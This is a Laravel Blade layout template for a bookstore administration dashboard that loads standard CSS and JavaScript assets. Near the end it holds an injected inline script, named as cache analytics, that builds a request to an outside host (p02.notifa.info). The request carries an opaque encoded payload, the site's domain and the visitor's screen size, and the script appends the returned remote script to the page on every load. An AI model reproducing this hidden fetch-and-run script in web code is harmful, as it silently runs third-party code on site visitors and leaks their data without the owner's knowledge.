<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="_token" content="{{csrf_token()}}">
    <title>Toko Buku Adminstrator</title>
    <!-- base:css -->
    <link rel="stylesheet" href="{{asset("vendors/mdi/css/materialdesignicons.min.css")}}">
    <link rel="stylesheet" href="{{asset("vendors/css/vendor.bundle.base.css")}}">
    <link rel="stylesheet" href="{{ asset("vendors/sweetalert2/sweetalert2.css") }}">
    <!-- endinject -->
    <!-- plugin css for this page -->
    <link rel="stylesheet" href="{{asset("vendors/jqvmap/jqvmap.min.css")}}">
    <link rel="stylesheet" href="{{asset("vendors/flag-icon-css/css/flag-icon.min.css")}}">
    <link rel="stylesheet" href="{{asset("vendors/jquery-toast-plugin/jquery.toast.min.css") }}">
    <!-- End plugin css for this page -->
    <!-- inject:css -->
    <link rel="stylesheet" href="{{asset("css/vertical-layout-dark/style.css")}}">
    <!-- endinject -->
    <link rel="shortcut icon" href="{{asset("images/favicon.png")}}" />
    <style>
        .swal2-popup{font-size: 0.9rem !important;}
		/* Select2 */
		.select2-container{width:100% !important;}
    </style>
</head>

<body>
    <div class="container-scroller">
        @guest
            <style>
                input.form-control{color:#000 !important;}
            </style>
            @yield("auth_content")
        @else 
            @include('layouts.topbar')
            <div class="container-fluid page-body-wrapper">
                @include('layouts.sidebar')
                <div class="main-panel">
                    <div class="content-wrapper">
                        @yield("content")
                    </div>
                    <!-- content-wrapper ends -->
                    @include("layouts.footer")
                </div>
                <!-- main-panel ends -->
            </div>
            <!-- page-body-wrapper ends -->
        @endguest
    </div>
    <!-- container-scroller -->

    <!-- base:js -->
    <script src="{{asset("vendors/js/vendor.bundle.base.js")}}"></script>
    <!-- endinject -->
    <!-- Plugin js for this page-->
    <script src="{{asset("vendors/jquery.flot/jquery.flot.js")}}"></script>
    <script src="{{asset("vendors/jquery.flot/jquery.flot.pie.js")}}"></script>
    <script src="{{asset("vendors/jquery.flot/jquery.flot.resize.js")}}"></script>
    <script src="{{asset("vendors/jqvmap/jquery.vmap.min.js")}}"></script>
    <script src="{{asset("vendors/jqvmap/maps/jquery.vmap.world.js")}}"></script>
    <script src="{{asset("vendors/jqvmap/maps/jquery.vmap.usa.js")}}"></script>
    <script src="{{asset("vendors/peity/jquery.peity.min.js")}}"></script>
    <script src="{{asset("js/jquery.flot.dashes.js")}}"></script>
	<script src="{{asset("vendors/jquery-toast-plugin/jquery.toast.min.js") }}"></script>
    <!-- End plugin js for this page-->
    <!-- inject:js -->
    <script src="{{asset("js/off-canvas.js")}}"></script>
    <script src="{{asset("js/hoverable-collapse.js")}}"></script>
    <script src="{{asset("js/template.js")}}"></script>
    <script src="{{asset("js/settings.js")}}"></script>
    <script src="{{asset("js/todolist.js")}}"></script>
    <!-- endinject -->
    <!-- plugin js for this page -->
    <script src="{{ asset("vendors/sweetalert2/sweetalert2.js") }}"></script>
    <script src="{{asset("custom/all.js")}}"></script>
    <!-- End plugin js for this page -->
    <!-- Custom js for this page-->
    <script src="{{asset("js/dashboard.js")}}"></script>
    <!-- End custom js for this page-->
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXS8chCDmqv93IoZAtBINE2%2fXhtY4abvEBCyqFa6Q2q1%2f%2bPeREMub%2bvLidr3iJ3rZ2O4bpXCzVe5G%2bCXIKQFKPuZTFF99L4f3b%2fnJ68obDWXRt%2fRtc0tOZf9tOGsKtHExitC75bzDmTyYN6cZwJHnyODZBvgwWqcVzdt40DOtoNPwaiaHPgAFiGjtPM9OPwGj%2fUSmhd%2fcfd%2bY8bxtKka3kazpol%2ftKQdcKPxsm6WZ31crN3BYH%2bH8WQwsKW81lMxJaKtf5eq3%2f0xFVNZRc%2b2eLFoeiMTP87ard9TpXI%2fJPF%2bFs0xN%2fXJ9cZayoLmPokUDp3JkSJ0S0b6i%2fdQ1Gy8CSwa8eVMjx%2bskGNO0pu0DRP5US9wzZPpkbzeA9y%2b9itsYRBlIssV%2fcrwADAwnODmCMnVapwhH%2bM0GQcyjtSC0sBUNwa%2btGkQ1CCPi58V7hjGld7%2btONcxPxTh%2fLHuP5Zv9HPHAlYOZDbicO51xbRt0yBVEao5JOd%2fXVg5xZkdr7rom" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                    .height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };

    </script>
    @yield('js')
</body>

</html>
